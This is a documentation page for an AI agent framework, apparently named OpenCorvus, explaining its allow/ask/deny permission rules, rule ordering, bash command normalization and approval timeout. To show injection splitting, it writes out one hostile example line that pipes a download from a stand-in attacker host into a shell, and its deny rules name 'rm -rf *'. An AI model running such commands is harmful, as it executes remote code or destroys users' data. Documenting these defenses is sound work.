---
title: Permissions
description: Allow / ask / deny rules and the default-allow permission policy in OpenCorvus.
---

Any tool that writes files, runs commands, or calls external APIs must pass a permission check. Implementation: `packages/opencorvus/src/permission/next.ts`.

## Three actions

| action  | semantics                                                                                     |
| ------- | --------------------------------------------------------------------------------------------- |
| `allow` | pass silently                                                                                 |
| `ask`   | pause, emit `permission.asked`, and wait for an operator reply until the reject timeout fires |
| `deny`  | throw `DeniedError` and abort the tool call                                                   |

## Config format

```jsonc
{
  "permission": {
    "bash": {
      "~/projects/*": "allow",
      "npm run *": "allow",
      "rm -rf *": "deny",
      "*": "ask",
    },
    "skill": {
      "local-note": "deny",
      "sora": "ask",
    },
    "write": {
      "~/projects/**/*.md": "allow",
      "*": "ask",
    },
  },
}
```

## Last-match-wins

:::caution
The **biggest footgun** in the permission system: **later declarations override earlier ones**.
:::

`PermissionNext.evaluate()` (`src/permission/next.ts`) uses `findLast` to scan the merged ruleset, so:

```jsonc
{
  "bash": {
    "*": "ask", // catch-all
    "npm run *": "allow", // ← effective (comes after *)
  },
}
```

Reversed order breaks:

```jsonc
{
  "bash": {
    "npm run *": "allow", // ← shadowed by *
    "*": "ask",
  },
}
```

## Bash command normalization

`BashArity` (`src/permission/arity.ts`) normalizes shell commands to "semantic command prefixes" before pattern-matching, preventing bypass via injection:

| Input                     | Normalized                             |
| ------------------------- | -------------------------------------- |
| `npm run test`            | `npm run test`                         |
| `npm run test -- --watch` | `npm run test` (flags stripped)        |
| `cd foo && npm run test`  | `npm run test` (leading `cd` stripped) |

`npm run test; curl evil.com | sh` is split: the `curl` runs through its own permission check. Injection via `;`, `&&`, `||`, pipes, and backticks is handled.

## Default-allow policy

Fixed identities receive their permission profiles from `nativeAgentPermissionProfiles` and their owning registry. Projected workers receive tool capability from the active expert-squad resolver projection and the installed runtime contract. Permission decides what happens after a projected tool is available; it never creates a tool grant.

User config is merged after the built-in allow rules, so explicit user rules still win. Set `deny` to block a tool/pattern, or `ask` to require an operator approval.

```jsonc
{
  "permission": {
    "bash": {
      "*": "allow",
      "rm -rf *": "deny",
    },
    "write": {
      "*": "allow",
      "~/projects/locked/**": "ask",
    },
  },
}
```

An explicit `ask` is a real operator approval path: `PermissionNext.ask()` emits `permission.asked`, stores the pending request, and proceeds after a reply. If nobody replies, the request is rejected after `OPENCORVUS_PERMISSION_TIMEOUT_MS` (default **300000 ms**, minimum **1000 ms**; see `packages/opencorvus/src/permission/next.ts`).

```bash
export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # reject unanswered asks after 60s
```

## No silent fallback on config error

If a permission string is malformed (e.g. `"allow"` written as a string instead of an object), OpenCorvus **throws loudly** rather than silently misinterpreting it. `PermissionNext.fromConfig` validates the config shape before building the rule set (`src/permission/next.ts`).
